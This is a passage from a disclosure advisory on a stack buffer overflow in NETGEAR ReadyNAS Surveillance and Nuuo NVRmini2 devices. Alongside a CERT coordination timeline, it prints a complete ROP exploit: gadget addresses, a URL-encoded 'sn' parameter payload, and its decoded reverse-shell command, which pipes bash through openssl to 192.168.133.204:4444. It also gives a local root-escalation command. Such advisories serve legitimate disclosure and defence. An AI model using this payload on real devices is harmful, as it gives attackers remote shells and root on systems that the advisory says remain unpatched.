Other firmware versions will have different gadget addresses. On version 3.0.0 it should work without any modification.

> Exploitation on ReadyNAS Surveillance (version v1.1.2):
To develop this example exploit libcrypto.so.0.9.8 was used. The library is loaded at B6xxx000, where xxx are 4096 possible values for the memory address, as the ReadyNAS has a weak form of ASLR. For this exploit, B6CCE000 was chosen as the target base address (this was chosen randomly from a sample of collected base addresses).

The exploit connects a reverse shell to 192.168.133.204:4444 using OpenSSL. The following ROP gadgets were used:
0x000b3d9c : mov r1, sp ; mov r2, ip ; blx r6 -> located at B6D81D9C (first gadget, gets the location of the stack pointer sp, where the shellcode is located, in r1)
0x00008690 : movs r0, r1 ; movs r0, r0 ; movs r2, r2 ; movs r2, r1 ; bx r7 -> located at B6CD6691 as this is a THUMB mode gadget (second gadget, sets up the arguments to system(), putting them into r0)
0xb6ef91bc: fixed system() address when B6CCE000 is chosen as the base address of libcrypto.so.0.9.8 (takes the argument from r0 - pointing to sp - and executes it)
Payload: (in the stack) -> %6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26 ("mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.133.204:4444 > /tmp/s; rm /tmp/s &")

Illustration:
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{second_gadget}{system_address}aaaa{first_gadget}aaaaaaaaaaaa{payload}

Exploit for ReadyNAS Surveillance v1.1.2 ("sn" parameter value):
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%91%66%cd%b6%bc%91%ef%b6aaaa%9c%1d%d8%b6aaaaaaaaaaaa%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26

Note that due to the ASLR in the ReadyNAS his exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.

> Local exploitation:
This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>'
The cgi_main binary is located at "/apps/surveillance/bin/cgi_main" on the ReadyNAS and "/NUUO/bin/cgi_main" on the NVRmini2.

It is likely that all other vulnerabilities in this advisory are exploitable by a local attacker, however this has only been tested for the stack buffer overflow.


>> Fix: 
NETGEAR and Nuuo did not respond to CERT/CC coordination efforts (see Timeline below), so no fix is available.
Do not expose any of these devices to the Internet or any networks with unstrusted hosts.

Timeline:
28.02.2016: Disclosure to CERT/CC.
27.04.2016: Requested status update from CERT - they did not receive any response from vendors.
06.06.2016: Requested status update from CERT - still no response from vendors.
            Contacted Nuuo and NETGEAR directly. NETGEAR responded with their "Responsible Disclosure Guidelines", to which I did not agree and requested them to contact CERT if they want to know the details about the vulnerabilities found. No response from Nuuo.
13.06.2016: CERT sent an update saying that NETGEAR has received the details of the vulnerabilities, and they are attempting to contact Nuuo via alternative channels.
07.07.2016: CERT sent an update saying that they have not received any follow up from both Nuuo and NETGEAR, and that they are getting ready for disclosure.
17.07.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received.
01.08.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received.
04.08.2016: Coordinated disclosure with CERT.


>> References:
[1] https://www.kb.cert.org/vuls/id/856152


================
Agile Information Security Limited
http://www.agileinfosec.co.uk/
>> Enabling secure digital business >>